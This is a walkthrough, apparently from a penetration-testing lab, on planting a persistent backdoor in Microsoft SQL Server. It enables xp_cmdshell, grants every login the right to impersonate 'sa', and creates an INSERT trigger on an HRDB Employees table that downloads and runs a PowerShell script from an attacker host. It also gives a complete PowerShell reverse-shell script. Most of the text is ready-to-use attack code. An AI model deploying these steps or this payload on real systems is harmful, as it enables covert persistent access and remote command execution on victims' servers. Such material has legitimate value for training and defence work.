**There are several way to `implant a Backdoor` but we will abuses `triggers` in MSSQL.**
- `Triggers:` allows you to bind actions to be performed when specific events occur in database. The events can be user logging, data being inserted, updated or deleted from a given table.

**For this task, we will create a trigger for any `INSERT` into the `HRDB` database.**

#### Reconfigure a few things, before creating the `trigger`
1. **Enable `xp_cmdshell`**
	1. A built-in stored procedure ***provided by default*** in any MSSQL and allows you to ***execute system commands directly***.
	2. ***Disabled by default***, must be enabled.
	
2. To enable the `xp_cmdshell`, open `Microsoft SQL Server Management Studio 18` from the start menu. When asked for authentication, just use ***Windows Authentication (default value)*** and ***you will be logged on with the credentials of your current user***. By default, the ***local Administrator will have access to all DBs***.

3. Once logged in, Click on the `New Query` button.

4. Run the following SQL sentences ***to enable the "Advanced Options"*** in MSSQL configuration, and ***proceed to enable `xp_cmdshell`:*** 
	```
	sp_configure 'Show Advanced Options',1;
	RECONFIGURE;
	GO
	
	sp_configure 'xp_cmdshell',1;
	RECONFIGURE;
	GO

	# Use RECONFIGURE; if required
	```
	- `Execute`

5. After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only `sysadmin` users can do so. Since ***web applications use a restricted database user***, we can ***grant privileges to all users to impersonate the `sa` user***, which is the default database administrator.
	```
	USE MASTER
	
	GRANT IMPERSONATE ON LOGIN::sa to [Public];
	```

6. Finally, configure a trigger. We start by changing to the `HRDB` database:
	```
	USE HRDB
	```

7. Our trigger will leverage `xp_cmdshell` to ***execute PowerShell to download and run a `.ps1`*** file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:
	```
	CREATE TRIGGER [sql_backdoor]
	ON HRDB.dbo.Employees 
	FOR INSERT AS
	
	EXECUTE AS LOGIN = 'sa'
	EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ATTACKER_IP>:8000/evilscript.ps1'')"';
	```

8. Now that the backdoor is setup, let's create `evilscrip.ps1` in our ***attacker's machine***, which will contain a PowerShell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

9. We need two terminals:
	1. The trigger will perform the first connection to download and execute `evilscript.sh`. Our trigger is using port 8000.
	2. The second connection will be a reverse shell.

10. Now, navigate to `http://<victim_ip>` from ***kali machine*** and ***insert an employee into the web application***. Since the web application will send an INSERT statement to the database, our `TRIGGER` will provide us access to system's console.